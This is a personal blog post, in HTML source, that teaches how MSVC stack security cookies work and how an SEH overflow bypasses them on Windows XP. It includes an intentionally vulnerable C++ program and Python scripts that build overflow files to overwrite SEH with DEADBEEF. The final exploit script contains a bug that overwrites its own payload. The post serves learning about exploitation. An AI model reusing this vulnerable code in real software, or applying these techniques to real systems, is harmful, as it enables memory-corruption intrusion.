@@ -1,0 +1,335 @@
+<!DOCTYPE html><html lang="en-us" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>[Learing] Bypassing Security Cookie with SEH | ISSAC/iss4cf0ng's blog</title><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="[Learing] Bypassing Security Cookie with SEH | ISSAC/iss4cf0ng's blog"><meta name="twitter:image" content="https://iss4cf0ng.github.io/images/meme/Wallpaper/MyArt/8.png"><meta property="og:title" content="[Learing] Bypassing Security Cookie with SEH"><meta property="og:image" content="https://iss4cf0ng.github.io/images/meme/Wallpaper/MyArt/8.png"><meta property="og:url" content="https://iss4cf0ng.github.io/2026/09/19/2026-9-19-SecurityCookie/index.html"><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":true,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js"></script><script>MathJax.Hub.Config({
+ menuSettings: {
+   zoom: "None"
+ },
+ showMathMenu: false,
+ jax: ["input/TeX","output/CommonHTML"],
+ extensions: ["tex2jax.js"],
+ TeX: {
+   extensions: ["AMSmath.js","AMSsymbols.js"],
+   equationNumbers: {
+     autoNumber: "AMS"
+   }
+ },
+ tex2jax: {
+   inlineMath: [["\\(", "\\)"]],
+   displayMath: [["\\[", "\\]"]]
+ }
+});</script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Brands';
+ src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Free';
+ src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><script async src="https://www.googletagmanager.com/gtag/js?id=G-RQ7HTMYT8W"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-RQ7HTMYT8W');</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ISSAC/iss4cf0ng's blog" type="application/atom+xml">
+</head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/About/"><span class="navItemTitle">About</span></a></li><li class="navItem"><a class="navBlock" href="/Alien/"><span class="navItemTitle">Alien</span></a></li><li class="navItem"><a class="navBlock" href="/Arsenal/"><span class="navItemTitle">Arsenal</span></a></li><li class="navItem"><a class="navBlock" href="/2026/01/28/2026-1-28-ToolsDuplexSpy-v2-0-0/"><span class="navItemTitle">DuplexSpy</span></a></li><li class="navItem"><a class="navBlock" href="/Notes/"><span class="navItemTitle">Notes</span></a></li><li class="navItem"><a class="navBlock" href="/Series/"><span class="navItemTitle">Series</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[Learing] Bypassing Security Cookie with SEH</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2026-09-19T06:29:33.000Z" id="date"> 2026-09-19</time></div></span><br><span>Last Update: <div class="control"><time datetime="2026-09-20T15:26:43.193Z" id="updated"> 2026-09-20</time></div></span><br><span>Word Count: <div class="control">1.4k</div></span><br><span>Read Time: <div class="control">8 min</div></span></div></div><hr><div id="post-content"><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article is part of my series: <strong><a href="/FromBugToExploit">From Bug To Exploit</a></strong>.</p>
+<p>In this article, I will explore how to bypass <strong>security cookie</strong> while performing a buffer overflow attack.</p>
+<p align="center" class='item-img' data-src='/images/meme/mika_rollcake.png'><img src="/images/meme/mika_rollcake.png" width=250/>
+</p>
+
+<h1 id="What-Is-Security-Cookie"><a href="#What-Is-Security-Cookie" class="headerlink" title="What Is Security Cookie?"></a>What Is Security Cookie?</h1><p>A <strong>security cookie</strong> (a.k.a. **stack canary) is a random value placed on the stack by a compiler between local variable and critical data, such as the return address.</p>
+<p>If a stack-based buffer overflow occurs, the overflow may overwrite the cookie. The program detects the change before returning and immediately terminates to prevent code execution.</p>
+<p>In an x86 application, the return address is stored at <code>EBP + 4</code>, and in this example, the security cookie is stored at <code>EBP - 4</code>. When a buffer overflow occurs, it overwrites data from lower addresses to high addresses, potentially overwriting <code>EBP + 4</code> (the return address). In other words, <code>EBP - 4</code> will be overwritten as well.</p>
+<p>The application then checks the value of the security cookie stored at <code>EBP - 4</code>. Since its value has been overwritten, it cannot pass the validation. Therefore, the system terminates the application by raising an exception.</p>
+<h1 id="Demonstration"><a href="#Demonstration" class="headerlink" title="Demonstration"></a>Demonstration</h1><h2 id="How-Security-Cookie-Works"><a href="#How-Security-Cookie-Works" class="headerlink" title="How Security Cookie Works"></a>How Security Cookie Works</h2><p>In this section, I will demonstrate how security cookie prevents overwriting the return address by a buffer overflow attack.</p>
+<p>Save the C++ code below as <code>gs.cpp</code> in <strong>Visual Studio (not Visual Studio Code)</strong>:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">function_empty</span><span class="hljs-params">()</span> </span>&#123;&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">function_int_2</span><span class="hljs-params">()</span> </span>&#123;<br>	<span class="hljs-type">int</span> ia[<span class="hljs-number">2</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">function_int_3</span><span class="hljs-params">()</span> </span>&#123;<br>	<span class="hljs-type">int</span> ia[<span class="hljs-number">3</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">function_string</span><span class="hljs-params">()</span> </span>&#123;<br>	std::string s;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">function_char_4</span><span class="hljs-params">(<span class="hljs-type">char</span>* in)</span> </span>&#123;<br>	<span class="hljs-type">char</span> ca[<span class="hljs-number">4</span>](<span class="hljs-string">&quot;&quot;</span>);<br>	std::<span class="hljs-built_in">strcpy</span>(ca, in);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">function_char_5</span><span class="hljs-params">(<span class="hljs-type">char</span>* in)</span> </span>&#123;<br>	<span class="hljs-type">char</span> ca[<span class="hljs-number">5</span>](<span class="hljs-string">&quot;&quot;</span>);<br>	std::<span class="hljs-built_in">strcpy</span>(ca, in);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>	<span class="hljs-type">static</span> <span class="hljs-type">char</span> atk[] = <span class="hljs-string">&quot;AAAAAAAA&quot;</span> <span class="hljs-string">&quot;BBBB&quot;</span> <span class="hljs-string">&quot;\xEF\xBE\xAD\xDE&quot;</span>;<br>	<span class="hljs-built_in">function_char_5</span>(atk);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>Configure the build mode as <strong>Release</strong>:</p>
+<p align="center" class='item-img' data-src='/images/article/2026-9-19-SecurityCookie/21.png'><img src="/images/article/2026-9-19-SecurityCookie/21.png" width=600/>
+</p>
+
+<p>And then build the application.</p>
+<blockquote>
+<p>Note: You can do this on your production machine.</p>
+</blockquote>
+<p>Next, open <code>gs.exe</code> with <strong>WinDbg</strong>.</p>
+<p>Run the command below to disassemble the function <code>function_string</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">uf function_string<br></code></pre></td></tr></table></figure>
+<p align="center" class='item-img' data-src='/images/article/2026-9-19-SecurityCookie/1.png'><img src="/images/article/2026-9-19-SecurityCookie/1.png" width=800/>
+</p>
+
+<p>Here, the highlighed instructions in the picture above are related to the security cookie. We can see that this mechanism validates the cookie by performing an XOR operation. If the value is incorrect, the process terminates.</p>
+<p>We can read the value of the security cookie with the command below:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">dd __security_cookie L1<br></code></pre></td></tr></table></figure>
+<p align="center" class='item-img' data-src='/images/article/2026-9-19-SecurityCookie/2.png'><img src="/images/article/2026-9-19-SecurityCookie/2.png" width=600/>
+</p>
+
+<p>This value is not constant. Therefore, we cannot predict its value in advance in order to bypass the protection.</p>
+<p>Let’s disassemble the function <code>function_empty</code>:</p>
+<p align="center" class='item-img' data-src='/images/article/2026-9-19-SecurityCookie/3.png'><img src="/images/article/2026-9-19-SecurityCookie/3.png" width=800/>
+</p>
+
+<p>As we can see in the picture, there is no security cookie protection. Therefore, we can infer that compilers do not always add protection to every function. In this case, Visual Studio did not add one because the function is completely empty.</p>
+<p>How about other functions? Let’s disassemble <code>function_int_2</code> and <code>function_int_3</code>:</p>
+<p align="center" class='item-img' data-src='/images/article/2026-9-19-SecurityCookie/4.png'><img src="/images/article/2026-9-19-SecurityCookie/4.png" width=800/>
+</p>
+
+<p align="center" class='item-img' data-src='/images/article/2026-9-19-SecurityCookie/5.png'><img src="/images/article/2026-9-19-SecurityCookie/5.png" width=800/>
+</p>
+
+<p>Visual Studio did not add any protection. Therefore, we can presume that if the buffer is too small to perform a buffer overflow attack, the compiler may not add security cookie protection to the function.</p>
+<p>Lastly, let’s disassemble <code>function_char_4</code>. We can see that this function has security cookie protection:</p>
+<p align="center" class='item-img' data-src='/images/article/2026-9-19-SecurityCookie/6.png'><img src="/images/article/2026-9-19-SecurityCookie/6.png" width=800/>
+</p>
+
+<p>Next, let’s try to run the application by entering the command <code>g</code>. Our application will then terminate with an exception: <strong>“Security check failure or stack buffer overrun”</strong>:</p>
+<p align="center" class='item-img' data-src='/images/article/2026-9-19-SecurityCookie/7.png'><img src="/images/article/2026-9-19-SecurityCookie/7.png" width=800/>
+</p>
+
+<p>Let’s look inside the function <code>__security_check_cookie</code>:</p>
+<p align="center" class='item-img' data-src='/images/article/2026-9-19-SecurityCookie/8.png'><img src="/images/article/2026-9-19-SecurityCookie/8.png" width=800/>
+</p>
+
+<p>We can see that if the value doesn’t match, the function calls another function, <code>__raise_securityfailure</code>, and therefore terminates the process.</p>
+<p align="center" class='item-img' data-src='/images/article/2026-9-19-SecurityCookie/9.png'><img src="/images/article/2026-9-19-SecurityCookie/9.png" width=800/>
+</p>
+
+<h2 id="Without-Security-Cookie"><a href="#Without-Security-Cookie" class="headerlink" title="Without Security Cookie"></a>Without Security Cookie</h2><p>In this section, I will show what happends when the security cookie is disabled.</p>
+<p>Configure Visual Studio by going to <code>Options</code> -&gt; <code>Code Generation</code>. Set <code>Basic Runtime Checks</code> to <code>Default</code> and <code>Security Check</code> to <code>Disable Security Check (/GS)</code>.</p>
+<p align="center" class='item-img' data-src='/images/article/2026-9-19-SecurityCookie/10.png'><img src="/images/article/2026-9-19-SecurityCookie/10.png" width=800/>
+</p>
+
+<p>Then, compile <code>gs.exe</code> again.</p>
+<p>This time, as shown in WinDbg, we can see that security cookie protection no longer exists:</p>
+<p align="center" class='item-img' data-src='/images/article/2026-9-19-SecurityCookie/11.png'><img src="/images/article/2026-9-19-SecurityCookie/11.png" width=800/>
+</p>
+
+<p>Run the application by entering the command <code>g</code>, and <code>EIP</code> is overwritten with <code>DEADBEEF</code>:</p>
+<p align="center" class='item-img' data-src='/images/article/2026-9-19-SecurityCookie/12.png'><img src="/images/article/2026-9-19-SecurityCookie/12.png" width=800/>
+</p>
+
+<h2 id="Bypassing-Security-Cookie"><a href="#Bypassing-Security-Cookie" class="headerlink" title="Bypassing Security Cookie"></a>Bypassing Security Cookie</h2><p>In this section, I will show how to bypass the security cookie.</p>
+<p>The first method is to overflow a <strong>virtual function</strong>. Before 2008, this method could bypass the protection. One day, however, a researcher introduced this technique at <strong>Black Hat</strong>. <strong>This vulnerability was then quickly patched by Microsoft</strong>.</p>
+<blockquote>
+<p>Note: In case you’re wondering, the paper is <a target="_blank" rel="noopener" href="https://blackhat.com/presentations/bh-usa-08/Sotirov_Dowd/bh08-sotirov-dowd.pdf">Bypassing Browser Memory Protection</a>, on page 18.</p>
+</blockquote>
+<p>In other words, this method is no longer exploitable. Therefore, I will introduce the second method: bypassing the security cookie with SEH.</p>
+<blockquote>
+<p>Note: I will discuss the first method in a future post!</p>
+</blockquote>
+<p>Now we know the principle of the security cookie and understand how it protects the stack.</p>
+<p>However, it cannot prevent a buffer overflow through an SEH overflow.</p>
+<p>Now, enable the security cookie again and compile the application.</p>
+<p>This time, we are going to exploit it on Windows XP (since I only installed Immunity Debugger on it…).</p>
+<p>If you compile your C++ application directly using the latest version of Visual Studio, the executable probably cannot run on Windows XP.</p>
+<p>In this case, open <code>Options</code> -&gt; <code>Linker</code> -&gt; <code>System</code>. Set <code>Minimum Required Version</code> to <code>5.01</code>.</p>
+<p align="center" class='item-img' data-src='/images/article/2026-9-19-SecurityCookie/13.png'><img src="/images/article/2026-9-19-SecurityCookie/13.png" width=800/>
+</p>
+
+<blockquote>
+<p>Note: Here, <code>5</code> and <code>1</code> represent the <strong>Major ID</strong> and <strong>Minor ID</strong>, respectively. The version number <code>5.01</code> represents Windows XP.</p>
+</blockquote>
+<p>Save the code below as <code>vulnerable_sc.cpp</code> and compile it:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// vulnerable_sc.cpp</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _CRT_SECURE_NO_WARNINGS</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">char</span> global[<span class="hljs-number">128</span>] = <span class="hljs-string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x5b\x5b\xc3&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">do_something</span><span class="hljs-params">(FILE* pfile)</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-type">char</span> buffer[<span class="hljs-number">128</span>];<br><br>	<span class="hljs-built_in">fscanf</span>(pfile, <span class="hljs-string">&quot;%s&quot;</span>, global);<br>	<span class="hljs-built_in">fscanf</span>(pfile, <span class="hljs-string">&quot;%s&quot;</span>, buffer);<br><br>	<span class="hljs-comment">// do file reading and parsing below</span><br>	<span class="hljs-comment">// ...</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-type">char</span> dummy[<span class="hljs-number">1024</span>];<br>	FILE* pfile;<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Vulnerable001 starts...\n&quot;</span>);<br><br>	<span class="hljs-keyword">if</span> (argc &gt;= <span class="hljs-number">2</span>)<br>		pfile = <span class="hljs-built_in">fopen</span>(argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;r&quot;</span>);<br>	<span class="hljs-keyword">else</span><br>		<span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>	<span class="hljs-keyword">if</span> (pfile != <span class="hljs-literal">NULL</span>)<br>		<span class="hljs-built_in">do_something</span>(pfile);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;vulnerable_sc ends...\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>Overflow the application with the Python script below:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># dos.py</span><br><br>filename = <span class="hljs-string">&#x27;exploit.txt&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    global_junk = <span class="hljs-string">b&#x27;junk\n&#x27;</span><br>    local_junk = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">2000</span><br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(global_junk)<br>        f.write(local_junk)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] OK&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
+<p align="center" class='item-img' data-src='/images/article/2026-9-19-SecurityCookie/14.png'><img src="/images/article/2026-9-19-SecurityCookie/14.png" width=700/>
+</p>
+
+<p>We can see that the values of <code>SEH</code> and <code>NSEH</code> have been overwritten. Therefore, the remaining task is to find the exact offset with <code>mona</code>:</p>
+<p align="center" class='item-img' data-src='/images/article/2026-9-19-SecurityCookie/15.png'><img src="/images/article/2026-9-19-SecurityCookie/15.png" width=800/>
+</p>
+
+<p align="center" class='item-img' data-src='/images/article/2026-9-19-SecurityCookie/16.png'><img src="/images/article/2026-9-19-SecurityCookie/16.png" width=800/>
+</p>
+
+<p>Lastly, the <code>DEADBEEF</code> PoC can be implemented as follows:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># exploit.py</span><br><br><span class="hljs-keyword">import</span> struct<br><br>filename = <span class="hljs-string">&#x27;exploit.txt&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    global_junk = <span class="hljs-string">b&#x27;junk\n&#x27;</span><br>    local_junk = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">188</span><br>    local_junk += <span class="hljs-string">b&#x27;\xcc\xcc\xcc\xcc&#x27;</span><br>    local_junk += struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0xDEADBEEF</span>)<br>    local_junk = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">100</span> <span class="hljs-comment"># to raise an exception</span><br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(global_junk)<br>        f.write(local_junk)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] OK&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
+<p>Then we can overwrite <code>EIP</code> with <code>DEADBEEF</code>!</p>
+<p align="center" class='item-img' data-src='/images/article/2026-9-19-SecurityCookie/14.png'><img src="/images/article/2026-9-19-SecurityCookie/14.png" width=700/>
+</p>
+
+<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>In this article, I learned how the security cookie works and how it protects the stack from buffer overflow attacks. I also learned how an SEH overflow can be used to bypass this protection.</p>
+<p>To be honest, the bypass itself was not particularly difficult for me. Since I had already learned and practiced SEH overflows before, I was already familiar with the basic principle. The most difficult part was actually setting up the environment.</p>
+<p>The textbook uses old versions of WinDbg and Visual Studio, which are quite difficult to find nowadays. Therefore, if you also want to practice these techniques, you should not blindly follow the exact values shown in this article. The addresses, offsets, and other values can be different depending on your environment.</p>
+<p>As for the virtual function technique I mentioned earlier, unless you are specifically targeting applications released before 2008, it is generally no longer useful because the relevant protection has already been patched.</p>
+<p>However, I will spend some time studying this technique in the future and write another blog post about it as well!</p>
+<p>This is the end of the article. If you have any comments or suggestions, please feel free to leave them below!</p>
+<h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING!"></a>THANKS FOR READING!</h1><p>I drew a <a target="_blank" rel="noopener" href="https://www.pixiv.net/artworks/149736038">new drawing</a>!</p>
+<p align="center" class='item-img' data-src='/images/meme/Wallpaper/MyArt/8.png'><img src="/images/meme/Wallpaper/MyArt/8.png" width=700/>
+    <figcaption>
+    ハグして？
+    </figcaption>
+</p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2026/09/17/2026-9-17-MS08-67/">[Learning] MS06-040 and MS08-067 Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="utterances-sel"></button></div><div id="utterances-container"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a target="_blank" rel="noopener" href="https://github.com/iss4cf0ng/" width="200" id="logo"><img src="https://avatars.githubusercontent.com/u/110074064?v=4" alt="Logo"></a><h1 id="Dr"><a href="/">ISSAC</a></h1><div id="description"><p>Everything is failing...</p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/iss4cf0ng/"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" target="_blank" rel="noopener" href="https://x.com/iss4c_f0ng/"><i class="fab fa-twitter" alt="X"></i></a></div><div id="rss-feed"><a class="social" id="rss-copy-button" href="javascript:void(0)" title="Copy RSS link to clipboard"><span>RSS</span></a></div></div><div id="music"></div><div class="music-box"><hr style="border:1px solid #ccc; margin:10px 0"><p class="music-title">Feeling exhausted? Let's enjoy (やさしい) music!</p><p style="text-align:center; position: relative"><img class="music-anime" id="anime-img" src="/images/meme/himari_coffee.2.jpg" width="150" height="200"></p><div style="text-align:center"><button class="music-btn" id="music-prev">⏮</button><button class="music-btn" id="music-toggle">▶ Play Music</button><button class="music-btn" id="music-next">⏭</button></div><div style="margin-top:5px"><span id="music-index"></span></div><hr style="border:1px solid #ccc; margin:10px 0"><audio id="bg-music"><source src="/mp3/music/music_1.mp3" type="audio/mpeg"></audio><script>document.addEventListener("DOMContentLoaded", function () {
+  var playlist = [
+    "/mp3/music/music_1.mp3",
+    "/mp3/music/sugar_story.mp3",
+    "/mp3/music/story_music_box.mp3",
+    "/mp3/music/last_page.mp3",
+    "/mp3/music/sunset_memory.mp3",
+    "/mp3/music/welcome_home.mp3",
+    "/mp3/music/canon.mp3",
+    "/mp3/music/arigadou.mp3",
+  ];
+
+  var current = 0;
+  const audio = document.getElementById("bg-music");
+  const btn = document.getElementById("music-toggle");
+  const prevBtn = document.getElementById("music-prev");
+  const nextBtn = document.getElementById("music-next");
+  const indexDisplay = document.getElementById("music-index");
+
+  function updateDisplay() {
+    indexDisplay.innerText = `Currently: ${current + 1} / ${playlist.length}`;
+  }
+
+  updateDisplay();
+
+  btn.addEventListener("click", function () {
+    if (audio.paused) {
+      audio.src = playlist[current];
+      audio.play();
+      btn.innerText = "⏸ Pause Music";
+    } else {
+      audio.pause();
+      btn.innerText = "▶ Play Music";
+    }
+  });
+
+  nextBtn.addEventListener("click", function () {
+    const wasPlaying = !audio.paused;
+
+    current = (current + 1) % playlist.length;
+
+    audio.src = playlist[current];
+    audio.load();
+
+    if (wasPlaying) {
+      audio.play();
+    }
+
+    updateDisplay();
+  });
+
+  prevBtn.addEventListener("click", function () {
+    const wasPlaying = !audio.paused;
+
+    current--;
+
+    if (current < 0)
+      current = playlist.length - 1;
+
+    audio.src = playlist[current];
+    audio.load();
+
+    if (wasPlaying) {
+      audio.play();
+    }
+
+    updateDisplay();
+  });
+
+  audio.addEventListener("ended", function() {
+    current = (current + 1) % playlist.length;
+    audio.src = playlist[current];
+    audio.play();
+    updateDisplay();
+  });
+});
+</script><script>document.addEventListener("DOMContentLoaded", function () {
+  const animeImg = document.getElementById("anime-img");
+
+  animeImg.addEventListener("click", function() {
+    
+    const tip = document.createElement("div");
+    tip.innerText = "?";
+    tip.style.position = "absolute";
+    tip.style.top = "-50px";
+    tip.style.left = "50%";
+    tip.style.transform = "translateX(-50%)";
+    tip.style.backgroundColor = "#fff";
+    tip.style.color = "rgb(16, 174, 11)";
+    tip.style.padding = "2px 6px";
+    tip.style.border = "1px solid #ccc";
+    tip.style.borderRadius = "8px";
+    tip.style.boxShadow = "0 3px 6px rgba(0,0,0,0.2)";
+    tip.style.fontSize = "50px";
+    tip.style.fontWeight = "bold";
+    tip.style.zIndex = "1000";
+    tip.style.opacity = "1";
+    tip.style.transition = "opacity 1s, top 1s";
+    
+    animeImg.parentElement.appendChild(tip);
+
+    setTimeout(() => {
+      tip.style.opacity = "0";
+      tip.style.top = "-60px";
+      setTimeout(() => tip.remove(), 1000);
+    }, 2000);
+  });
+});
+</script><script>document.addEventListener("DOMContentLoaded", function () {
+  const rssBtn = document.getElementById("rss-copy-button");
+
+  rssBtn.addEventListener("click", async () => {
+    const rssUrl = window.location.origin + "/atom.xml";
+    try {
+      await navigator.clipboard.writeText(rssUrl);
+
+      const tip = document.createElement("div");
+      tip.innerText = "RSS link copied!";
+      tip.style.position = "absolute";
+      tip.style.top = "-30px";
+      tip.style.left = "50%";
+      tip.style.transform = "translateX(-50%)";
+      tip.style.backgroundColor = "#0d0d0d";
+      tip.style.color = "#00fff7";
+      tip.style.border = "1px solid #ff00ff";
+      tip.style.boxShadow = "0 0 8px #ff00ff, 0 0 16px #00fff7";
+      tip.style.padding = "2px 6px";
